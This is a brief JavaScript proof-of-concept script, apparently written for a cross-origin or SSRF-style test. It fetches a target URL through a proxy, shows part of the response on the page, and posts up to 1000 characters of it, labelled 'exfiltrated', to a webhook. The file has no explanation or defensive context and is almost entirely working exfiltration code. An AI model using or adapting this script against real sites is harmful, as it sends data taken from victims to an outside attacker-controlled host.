console.log("🔍 PoC script started...");

fetch(`${proxy}?url=${encodeURIComponent(target)}`, {
  credentials: "omit"
})
  .then(res => {
    console.log("✅ Received response:", res.status);
    return res.text();
  })
  .then(data => {
    console.log("📦 Data received:", data.slice(0, 200));
    document.body.innerHTML += "<pre style='color:lime'>" + data.slice(0, 500) + "</pre>";
    fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ exfiltrated: data.slice(0, 1000), source: target })
    });
  })
  .catch(e => {
    console.error("❌ Fetch failed:", e);
    document.body.innerHTML += `<pre style='color:red'>❌ Error: ${e}</pre>`;
  });
